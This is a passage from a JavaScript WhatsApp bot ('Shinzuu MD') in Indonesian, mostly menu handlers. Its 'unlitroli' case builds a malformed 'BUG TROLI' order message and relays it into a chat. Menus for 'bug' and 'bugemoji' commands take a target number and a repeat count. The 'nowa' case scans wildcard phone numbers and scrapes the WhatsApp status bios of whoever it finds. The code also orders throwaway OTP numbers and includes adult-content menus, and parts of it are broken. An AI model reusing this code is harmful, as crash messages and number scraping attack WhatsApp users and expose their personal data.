.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await Biiofc.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}

let vote = db.others.vote = []

let teks_format =`*Berikut ini cara order kode otp*

_Example_
.order id

_Contoh_
.order 14

untuk melihat id layanan
silahkan ketik .layanan`

let teks_format2 = `Format Salah !!

_Example_
.getorder <order_id>

_Contoh_
.getorder 55778888
`
switch (command) {
case "menu": {

if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*ʜᴀʟᴏ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

❖   *ᴠᴇʀꜱɪᴏɴ :* 9.0
❖   *ᴀᴜᴛʜᴏʀ :* 胡桃 𝔰𝔪𝔡
❖   *ᴍʏ ᴛᴇᴀᴍ :* ᴛʜᴇ ᴅᴀʀᴋ ғᴀᴍɪʟʏ ❦︎
❖   *ꜱʜᴏᴡ ᴄᴏᴍᴀɴᴅ :* .ᴀʟʟᴍᴇɴᴜ
❖   *ꜱʜᴏᴡ ʟɪsᴛ ᴄᴏᴍᴀɴᴅ :* .ʟɪsᴛᴍᴇɴᴜ
❖   *ꜱʜᴏᴡ ᴀʙᴏᴜᴛ* 胡桃 

ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴩᴩ ᴏᴛᴏᴍᴀᴛɪꜱ yᴀɴɢ ᴅᴀᴩᴀᴛ ᴍᴇᴍʙᴀɴᴛᴜ ᴍᴇʟᴀᴋᴜᴋᴀɴ ꜱᴇꜱᴜᴀᴛᴜ, ᴍᴇɴᴄᴀʀɪ ᴅᴀɴ ᴍᴇɴᴅᴀᴩᴀᴛᴋᴀɴ ᴅᴀᴛᴀ ᴀᴛᴀᴜ ɪɴꜰᴏʀᴍᴀꜱɪ ᴍᴇʟᴀʟᴜɪ ᴡʜᴀᴛꜱᴀᴩᴩ.
ᴅᴀɴ ᴊɪᴋᴀ ᴋᴀʟɪᴀɴ ɪɴɢɪɴ ʙᴇʀᴅᴏɴᴀsɪ sɪʟᴀʜᴋᴀɴ ᴄʜᴀᴛ ᴏᴡɴᴇʀ ᴋᴜ ʏᴀʜʜ.
${readmore}
𖣂 *M E N U*

々 ${prefix}ᴀʟʟᴍᴇɴᴜ
々 ${prefix}ʟɪsᴛᴍᴇɴᴜ1
々 ${prefix}ʟɪsᴛᴍᴇɴᴜ2
々 ${prefix}ʟɪsᴛᴍᴇɴᴜ
々 ${prefix}sᴄʀɪᴘᴛ
々 ${prefix}ᴛǫᴛᴏ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦︎`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
      await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio5.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
      
case "listmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*ʜᴀʟᴏ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

ᴀᴋᴜ ᴀᴅᴀʟᴀʜ *sʜɪɴᴢᴜᴜ* *ᴍᴅ* ʏᴀɴɢ ᴅɪʙᴜᴀᴛ ᴏʟᴇʜ *ʜᴀʀᴅᴢsᴇɴᴘᴀɪɪ*, *sʜɪɴᴢᴜᴜ-ᴍᴅ* sɪᴀᴘ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀʟɪᴀɴ sᴜᴘᴀʏᴀ ʟᴇʙɪʜ ᴍᴜᴅᴀʜ. ᴊᴀɴɢᴀɴ ʟᴜᴘᴀ ʙᴇʀᴅᴏɴᴀsɪ ʏᴀ ᴋᴀᴋ.

𖣂 *I N F O - B O T*
*ᴏᴡɴᴇʀ* : *ʜᴀʀᴅᴢ sᴇɴᴘᴀɪɪ*
*ʙᴏᴛ ɴᴀᴍᴇ* : *sʜɪɴᴢᴜᴜ ᴍᴅ*
*ᴍʏ ᴛᴇᴀᴍ* : *𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦*
*ᴠᴇʀꜱɪᴏɴ* : *9.0.0*
*ᴛᴏᴛᴀʟ ғɪᴛᴜʀ* : *${totalFitur()}*
*ʙᴀɪʟᴇyꜱ* : *@adiwashing/baileys*
*ʀᴜɴᴛɪᴍᴇ :* *${runtime(process.uptime())} *

𖣂 *Y O U R - I N F O*
*ʏᴏᴜʀ ɴᴀᴍᴇ* : *${pushname.split}*
*ʏᴏᴜʀ ᴛᴀɢ* : *@${sender.split("@")[0]}*
*ᴏᴡɴᴇʀ* : ${isPremium ? '*ᴍʏ ᴏᴡɴᴇʀ*' : '*ɴᴏᴛ ᴍʏ ᴏᴡɴᴇʀ*'}
*ᴘʀᴇᴍɪᴜᴍ* : ${isPremium ? '*ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ*' : '*ғʀᴇᴇ ᴜsᴇʀ*'}
*sᴇʟᴇʀ* : ${isSeler ? '*sᴇʟʟᴇʀ*' : '*ɴᴏᴛ sᴇʟʟᴇʀ*'}

${readmore}
𖣂 *L I S T - M E N U ッ*

┌ ◦ ${prefix}ɢʀᴏᴜᴘᴍᴇɴᴜ
│ ◦ ${prefix}ᴏᴡɴᴇʀᴍᴇɴᴜ
│ ◦ ${prefix}ᴘᴜsʜᴋᴏɴᴛᴀᴋᴍᴇɴᴜ
│ ◦ ${prefix}ʙᴜɢᴍᴇɴᴜ
│ ◦ ${prefix}ᴘᴍ2ᴍᴇɴᴜ
│ ◦ ${prefix}ᴊᴇʙᴇʜᴍᴇɴᴜ
│ ◦ ${prefix}ʙᴏᴋᴇᴘᴍᴇɴᴜ
│ ◦ ${prefix}ᴀɴɪᴍᴇᴍᴇɴᴜ
│ ◦ ${prefix}ɴᴇᴡᴍᴇɴᴜ
│ ◦ ${prefix}ɴᴏᴋᴏsᴍᴇɴᴜ
│ ◦ ${prefix}ᴘᴀʏᴍᴇɴᴛᴍᴇɴᴜ
│ ◦ ${prefix}ᴀɴᴏɴʏᴍᴏᴜsᴍᴇɴᴜ
│ ◦ ${prefix}sᴀʟᴅᴏᴍᴇɴᴜ
│ ◦ ${prefix}sᴜɴᴛɪᴋᴍᴇɴᴜ
│ ◦ ${prefix}ᴄᴍᴅᴍᴇɴᴜ
│ ◦ ${prefix}ʀᴀɴᴅᴏᴍᴍᴇɴᴊ
│ ◦ ${prefix}ᴛɪᴋᴛᴏᴋʀᴀɴᴅᴏᴍᴇɴᴜ
│ ◦ ${prefix}ᴅᴏᴍᴀɪɴᴍᴇɴᴜ
│ ◦ ${prefix}ᴡᴇʙᴘᴍᴇɴᴜ
│ ◦ ${prefix}ᴠᴘsᴍᴇɴᴜ
│ ◦ ${prefix}ᴛᴏᴘᴜᴘᴍᴇɴᴊ
│ ◦ ${prefix}ᴛᴇxᴛᴡᴀᴍᴇɴᴜ
│ ◦ ${prefix}ᴘᴀɴᴇʟᴍᴇɴᴜ
│ ◦ ${prefix}ᴏᴛᴏᴍᴀᴛɪsᴍᴇɴᴜ
│ ◦ ${prefix}sᴛᴏʀᴇᴍᴇɴᴜ
│ ◦ ${prefix}ɴsғᴡᴍᴇɴᴜ
│ ◦ ${prefix}ᴀɴɪᴍᴇᴠ2ᴍᴇɴᴜ
└ ◦ ${prefix}ᴏᴘᴇɴᴀɪᴍᴇɴᴜ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄 - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break

case 'listmenu1': {
             Biiofc.sendMessage(m.chat,
              {           
              react: {             
              text: '⌛',             
              key: m.key
              }})           
                let hzee = `${menu1}`
                Biiofc.sendMessage(m.chat, {
          react: {
            text: '⌛',
            key: m.key
          }})
            Biiofc.sendMessage(m.chat, {
text: hzee,
contextInfo: {
externalAdReply: {
title: 'ShinzuuMD - V9',
body: 'HzOscorp',
thumbnailUrl: "https://telegra.ph/file/a3ac2f00daa729da99a33.jpg",
sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
mediaType: 1,
renderLargerThumbnail: true
}}}, { quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio6.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})
 Biiofc.sendMessage(m.chat, {
          react: {
            text: '✅',
            key: m.key
          }})
            }
            break
                
case 'menupoll': case 'listmenu2': {
                Biiofc.sendPoll(m.chat, "List Menu", ['GroupMenu','OwnerMenu','PushkontakMenu','BugMenu','Pm2Menu','JebehMenu','BokepMenu','AnimeMenu','NewMenu','NokosMenu','PaymentMenu','AnonymousMenu','SaldoMenu','SuntikMenu','CmdMenu','RandomMenu','TiktokRandomMenu','DomainMenu','WebpMenu','VpsMenu','TopupMenu','TextWaMenu','PanelMenu','OtomatisMenu','StoreMenu','NsfwMenu','AnimeV2Menu','AiMenu'])
                await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio7.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
            }
            break
case "nokosmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*ʜᴀʟᴏ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

𖣂 *N O K O S - M E N U ッ*

┌ ◦ ${prefix}ɴᴏᴡᴀ
々 ${prefix}ɢᴇᴛᴏʀᴅᴇʀ
々 ${prefix}ᴏʀᴅᴇʀ
々 ${prefix}ʟᴀʏᴀɴᴀɴ
└ ◦ ${prefix}ᴘʀᴏғɪʟᴇ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄 - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio6.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case 'profile':{
if (!IsOwner && !IsPremium) return (`Ngapain ? Khusus Hardz Offcial Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-profile/${apikeyotp}`)
if (kode.succes == false) return reply(kode.data.messages)
let res = kode.data.data
let teks =`*GET PROFILE*
- Username: ${res.username}
- Saldo: Rp${toRupiah(cekSaldo(sender, db_saldo))}
- Email: ${res.email}`
reply(teks)
}
break
case "order":{
if (!isOwner && !IsPremium) return (`Ngapain ? Khusus Hardz Offcial Aja !!`)
if (!q) return reply(teks_format)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}

• info selengkapnya
silahkan ketik .getorder`)
}
break
case 'nowa': {
if (!isOwner) return m.reply(`Kamu Siapa Banhj?`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('lah?')
m.reply('*Sabar Cuy Loading*')   
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `
======[ *LIST NUMBER WHATSAPP* ]=====

Punya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nNomor Tidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await PiwXHard.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await PiwXHard.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio = `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny = `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap = `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case "getorder":{
if (!isOwner && !IsPremium) return (`Ngapain ? Khusus Hardz Offcial Aja !!`)
if (!q) return reply(teks_format2)
var res = await fetchJson(`${global.domainotp}/set-orders/${apikeyotp}/${q}`)
if (res.success == false) return reply(res.data.messages)
reply(res.data.message)
await sleep(1000)
let ress = res.data.data
reply(`*Berikut Detail Orderan Anda*

- order_id: ${ress.order_id}
- aplikasi_id: ${ress.aplikasi_id}
- number: ${ress.number}
- status: ${ress.status}
- sms: ${ress.sms}
- status_sms: ${ress.status_sms}
- price: Rp${ress.price}
- last_saldo: Rp${toRupiah(ress.last_saldo)}
- created_at: ${ress.created_at}
- last_sms: ${ress.last_sms}
- aplikasi_name: ${ress.aplikasi_name}`)
}
break
case 'layanan':{
if (!isOwner && !IsPremium) return (`Ngapain ? Khusus Owner ajal Aja !!`)
let kode = await fetchJson(`${global.domainotp}/get-services/${apikeyotp}`)
if (kode.succes == false) return m.reply(kode.data.messages)
var teks = '*Cara Order Nokos, Silahkan Ketik:*\n.order id_layanan\n\n*Contoh:* .order 14\n\n*List Layanan Kode Otp*\n\n'
let GG = 0
for (let x of kode.data.data){
teks +=`- ID layanan: ${x.id}\n- Name: ${x.name}\n- Harga: Rp${toRupiah(x.price)}\n\n`
}
reply(teks)
}
break
        case 'unlitroli': {
if (!isPremium) return m.reply(`*khusus rakyat hardz*`)
jumlah = "1"
for (let i = 0; i < jumlah; i++) {
let dok = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage: {title: `${namabot}` ,jpegThumbnail: thumb}}}
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": 'HW MODS WA',
"orderTitle": " BUG TROLI ", // 
"sellerJid": "6282192773770@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted : lep})
Biiofc.relayMessage(from, order.message, { messageId: order.key.id })
}
await sleep(2000)
}
break
  case "jebehmenu": case "jb": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textbi = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *J E B E H - M E N U ッ*

┌ ◦ ${prefix}ғᴏʀᴍᴀᴛᴘᴏsᴛ
々 ${prefix}ғᴏʀᴍᴀᴛɴᴇᴇᴅ
々 ${prefix}ғᴇᴇʀᴇᴋʙᴇʀ
々 ${prefix}ғᴏʀᴍᴀᴛᴘᴇɴᴄᴀʀɪᴀɴ
々 ${prefix}ᴍᴄ
々 ${prefix}ᴀʟʟʀᴇᴄ
々 ${prefix}ᴅᴀɴᴀᴍᴀsᴜᴋ
々 ${prefix}ᴅᴏɴᴇʀᴇᴋʙᴇʀ
└ ◦ ${prefix}ᴅᴏɴᴇᴍᴄ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textbi,
      contextInfo: {
      externalAdReply: {
      title: '𝚂 𝙷 𝙸 𝙽 𝚉 𝚄 - 𝙼 𝙳',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio2.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "newmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*Hi @${sender.split("@")[0]} 👋*

𖣂 *N E W - M E N U ッ*

┌ ◦ ${prefix}tqto
々 ${prefix}cuaca
々 ${prefix}stalktiktok
々 ${prefix}couple
々 ${prefix}stalkig
々 ${prefix}infogempa
々 ${prefix}katanime
々 ${prefix}cerpen
々 ${prefix}reportbug
々 ${prefix}npmstalk
々 ${prefix}myip
々 ${prefix}mediafire
々 ${prefix}google
々 ${prefix}ytseacrh
々 ${prefix}ssweb
々 ${prefix}tourl
々 ${prefix}tomp4
々 ${prefix}toimg
々 ${prefix}togif
々 ${prefix}tovn
々 ${prefix}smeme
└ ◦ ${prefix}toaud

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio4.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "bokepmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *B O K E P - M E N U ッ*

┌ ◦ ${prefix}xɴxxsᴇᴀʀᴄʜ
々 ${prefix}xɴxxᴅʟ
└ ◦ ${prefix}ᴘᴘᴛᴛ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio3.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "animemenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *A N I M E - M E N U ッ*

┌ ◦ ${prefix}ᴀɴɪᴍᴇsᴘᴀɴᴋ
々 ${prefix}ᴡᴀʟʟᴘᴀᴘᴇʀᴀɴɪᴍᴇ
々 ${prefix}ᴛʜᴀɪʟᴀɴᴅ
々 ${prefix}ʟᴏʟɪ
々 ${prefix}ᴄᴏsᴘʟᴀʏ
々 ${prefix}ᴄᴇᴄᴀɴ
々 ${prefix}ᴄᴏɢᴀɴ
々 ${prefix}ᴄʜɪɴᴀ
々 ${prefix}ɪɴᴅᴏɴᴇsɪᴀ
々 ${prefix}ᴋᴏʀᴇᴀ
々 ${prefix}ᴍᴀʟᴀʏsɪᴀ
└ ◦ ${prefix}ᴠɪᴇᴛɴᴀᴍ

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: text12i,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "panelmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

𖣂 *P A N E L - M E N U ッ*

々 ${prefix}sᴇʀᴠᴇʀᴘᴀɴᴇʟ1

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textbi,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "serverpanel1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const textbi = `
*ʜᴀʟᴏ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

𖣂 *S E R V E R -  P A N E L 1 ッ*

┌ ◦ ${prefix}ᴘᴀɴᴇʟ
々 ${prefix}ʟɪɴᴋʟᴏɢ1
々 ${prefix}ʟɪsᴛᴜsʀ1
々 ${prefix}ᴅᴇʟᴜsʀ1
々 ${prefix}ʟɪsᴛsʀᴠ1
々 ${prefix}ᴅᴇʟsʀᴠ1
々 ${prefix}ᴘʀᴇᴍʟɪsᴛ1
々 ${prefix}ʀᴀᴍʟɪsᴛ1
々 ${prefix}ᴀᴅᴅᴜsʀ1
々 ${prefix}ᴀᴅᴅsʀᴠ1
々 ${prefix}ʀᴇɪɴsᴛᴀʟʟ1
々 ${prefix}ᴛᴜᴛᴏʀɪᴀʟ1
々 ${prefix}ᴜᴘᴅᴀᴛᴇsʀᴠ1
々 ${prefix}sᴜsᴘᴇɴᴅ1 *ɪᴅ*
々 ${prefix}ᴜɴsᴜsᴘᴇɴᴅ1 *ɪᴅ*
々 ${prefix}ᴄʀᴀᴛᴇᴀᴅᴍɪɴ1
└ ◦ ${prefix}ʟɪsᴛᴀᴅᴍɪɴ1

- 𝚃𝙷𝙴 𝙳𝙰𝚁𝙺 𝙵𝙰𝙼𝙸𝙻𝚈 ❦`
Biiofc.sendMessage(m.chat, {
      video: {url: "https://telegra.ph/file/5d1add8542f4ed8fe5a74.mp4"},
      gifPlayback: true,
      caption: textbi,
      contextInfo: {
      externalAdReply: {
      title: 'Shinzuu MultiDevice',
      body: 'Whatsapp',
      thumbnailUrl: 'https://telegra.ph/file/a3ac2f00daa729da99a33.jpg',
          sourceUrl: "https://chat.whatsapp.com/H1c7ncxpWkcEX9rClkNOBB",
      mediaType: 1,
      renderLargerThumbnail: true
      }}}, {quoted: m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio1.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "linklog1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Khusus Hardz Offcial Aja`)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN 1*
${domain}

 Powered By *@${hardznum.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, hardznum], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "bugemoji": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const version = require("baileys/package.json").version
const text12 = `
*ʜᴀɪ ᴋᴀᴋ @${sender.split("@")[0]} 👋*

𖣂 *B U G - E M O J I - M E N U ッ*
________________________________________
𖣂 *B U G - E M O J I - J U M L A H ッ*

┌ ◦ ${prefix}🌷 62xx|ᴊᴜᴍʟᴀʜ
々 ${prefix}🐲 62xx|ᴊᴜᴍʟᴀʜ
